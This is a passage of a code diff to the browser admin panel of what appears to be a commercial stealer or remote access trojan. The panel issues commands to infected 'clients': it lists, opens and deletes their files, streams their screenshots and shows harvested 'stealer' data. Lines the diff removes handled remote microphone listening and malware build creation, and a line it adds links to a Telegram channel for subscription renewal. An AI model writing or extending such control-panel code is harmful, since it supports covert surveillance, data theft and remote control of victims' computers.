-      .then(res => res.json())
-      .then(data => {
-        renewIcon.classList.remove("fa-spin");
-        if (data.success) {
-          status.textContent = `[Renew] Subscription renewed for ${selectedClient}`;
-          document.getElementById("profileSubscription").firstChild.textContent = data.new_status || "N/A";
-        } else {
-          status.textContent = `[Renew] Failed to renew subscription: ${data.message}`;
-        }
-      })
-      .catch(err => {
-        renewIcon.classList.remove("fa-spin");
-        status.textContent = `[Renew] Error renewing subscription: ${err}`;
-      });
+      // Здесь можно добавить логику для продления подписки
+      window.open('https://t.me/+85LIvpGqyhY2NTZi', '_blank');
     }
 
     function uploadProfileImage() {
-      if (!selectedClient) return;
-      
       const file = document.getElementById('profileUpload').files[0];
       if (!file) return;
       
-      const status = document.getElementById("stealerStatus");
-      status.textContent = `[Profile] Uploading profile image for ${selectedClient}...`;
+      if (file.size > 10 * 1024 * 1024) {
+        alert('Image must be less than 10MB');
+        return;
+      }
       
       const formData = new FormData();
-      formData.append("file", file);
-      formData.append("client_id", selectedClient.id);
-
-      fetch(`/upload_profile_image/${selectedClient.id}`, {
-        method: "POST",
+      formData.append('image', file);
+      
+      fetch('/upload_profile', {
+        method: 'POST',
         body: formData
       })
       .then(res => res.json())
       .then(data => {
         if (data.success) {
-          status.textContent = `[Profile] Profile image uploaded for ${selectedClient}`;
-          loadProfile(); // Reload profile to show updated image
+          const cacheBuster = '?t=' + new Date().getTime();
+          document.getElementById('profileImage').src = data.url + cacheBuster;
+          document.getElementById('profileDisplayImage').src = data.url + cacheBuster;
         } else {
-          status.textContent = `[Profile] Failed to upload profile image: ${data.message}`;
+          alert('Upload failed: ' + (data.error || 'unknown error'));
         }
       })
       .catch(err => {
-        status.textContent = `[Profile] Error uploading profile image: ${err}`;
+        console.error('Upload error:', err);
+        alert('Upload failed');
       });
     }
+    
 
-    // Build functions
-    function createBuild() {
-      if (!selectedClient) return;
+    
+    // Context menu functions
+    function showContextMenu(x, y) {
+      const menu = document.getElementById("contextMenu");
+      menu.style.left = `${x}px`;
+      menu.style.top = `${y}px`;
+      menu.style.display = "block";
+    }
+    
+    function hideContextMenu() {
+      document.getElementById("contextMenu").style.display = "none";
+    }
+    
+    function deleteFile() {
+      hideContextMenu();
+      if (!selectedClient || !rightClickedPath) return;
+      
+      console.log(`Deleting file: ${rightClickedPath}`);
+      
+      fetch(`/send/${selectedClient}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: "rm", data: rightClickedPath })
+      }).then(res => {
+        if (res.ok) {
+          console.log("File deleted successfully");
+          sendLs(currentPath);
+        } else {
+          console.log("Failed to delete file");
+        }
+      }).catch(error => {
+        console.error("Delete error:", error);
+      });
+    }
+    
+    function openFile() {
+      hideContextMenu();
+      if (!selectedClient || !rightClickedPath) return;
+      
+      console.log(`Opening file: ${rightClickedPath}`);
+      
+      fetch(`/send/${selectedClient}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: "open", data: rightClickedPath })
+      }).then(res => {
+        if (res.ok) {
+          console.log("File opened successfully");
+        } else {
+          console.log("Failed to open file");
+        }
+      }).catch(error => {
+        console.error("Open error:", error);
+      });
+    }
+    
+    function downloadFile() {
+      hideContextMenu();
+      if (!selectedClient || !rightClickedPath) return;
       
       const status = document.getElementById("stealerStatus");
-      status.textContent = `[Build] Creating build for ${selectedClient}...`;
+      status.textContent = `[File] Downloading ${rightClickedPath}...`;
       
-      fetch(`/create_build/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "create_build", data: "" })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.success) {
-          status.textContent = `[Build] Build created for ${selectedClient}`;
-          // Optionally, you might want to download the build here
-          // For now, just show the status
-        } else {
-          status.textContent = `[Build] Failed to create build: ${data.message}`;
+      // This would be implemented with server-side code
+      alert("todo");
+    }
+    
+    // WebSocket for real-time updates
+    const ws = new WebSocket(`ws://${location.host}/admin`);
+    ws.onmessage = (event) => {
+      const msg = JSON.parse(event.data);
+      if (msg.type === "screen") {
+        document.getElementById("screenshot").src = "data:image/jpeg;base64," + msg.data;
+      } else if (msg.type === "result") {
+        output.textContent += `[<-] ${msg.data}\n`;
+        output.scrollTop = output.scrollHeight;
+      } else if (msg.type === "explorer") {
+        try {
+          const explorerData = JSON.parse(msg.data);
+          if (explorerData && explorerData.items) {
+            renderExplorer(explorerData.items);
+          }
+        } catch (e) {
+          console.error("Error parsing explorer data:", e);
         }
-      })
-      .catch(err => {
-        status.textContent = `[Build] Error creating build: ${err}`;
-      });
-    }
-
-    function loadAudioDevices() {
-      if (!selectedClient) return;
-      fetch(`/send/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "list_audio_devices", data: "" })
-      });
-    }
-
-    function startListenAudio() {
-      if (!selectedClient) return;
-      const device = document.getElementById('audioDeviceSelect').value;
-      document.getElementById('audioStatus').textContent = `Запрос на прослушивание: ${device}`;
-      fetch(`/send/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "start_listen_audio", data: device })
-      });
-    }
-
-    function stopListenAudio() {
-      if (!selectedClient) return;
-      document.getElementById('audioStatus').textContent = `Остановлено`;
-      fetch(`/send/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "stop_listen_audio", data: "" })
-      });
-    }
-
-    // Initial load
-    initUI();
+      } else if (msg.type === "stealer") {
+        document.getElementById("stealerData").textContent = msg.data;
+        downloadBtn.style.display = 'block';
+      } else if (msg.type === "hello") {
+        // Handle hello message if needed
+      }
+    };
+    
+    // Initialize when page loads
+    window.onload = initUI;
+    
+    // Periodically load clients
+    setInterval(loadClients, 5000);
   </script>
 </body>
 </html>
